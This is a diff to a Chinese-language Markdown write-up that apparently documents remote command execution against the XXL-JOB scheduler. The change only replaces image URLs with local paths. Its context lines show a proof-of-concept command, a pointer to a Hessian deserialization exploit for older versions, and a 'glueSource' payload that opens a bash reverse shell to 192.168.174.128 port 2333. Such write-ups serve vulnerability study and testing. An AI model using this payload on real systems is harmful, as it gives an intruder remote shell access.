@@ -51,11 +51,11 @@ Content-Length: 365
 }
 ```
 
-![image-20220302232736378](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203022327467.png)
+![image-20220302232736378](./images/202203022327467.png)
 
 `touch /tmp/awesome_poc`已成功执行：
 
-![image-20220302232818916](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203022328972.png)
+![image-20220302232818916](./images/202203022328972.png)
 
 另外，低于2.2.0版本的XXL-JOB没有RESTful API，我们可以通过[Hessian反序列化](https://github.com/OneSourceCat/XxlJob-Hessian-RCE)来执行命令。
 
@@ -67,8 +67,8 @@ Content-Length: 365
 "glueSource": "bash -i >& /dev/tcp/192.168.174.128/2333 0>&1 "
 ```
 
-![image-20220302232933519](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203022329606.png)
+![image-20220302232933519](./images/202203022329606.png)
 
 监听2333端口，接收反弹shell：
 
-![image-20220302232912024](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203022329112.png)
+![image-20220302232912024](./images/202203022329112.png)
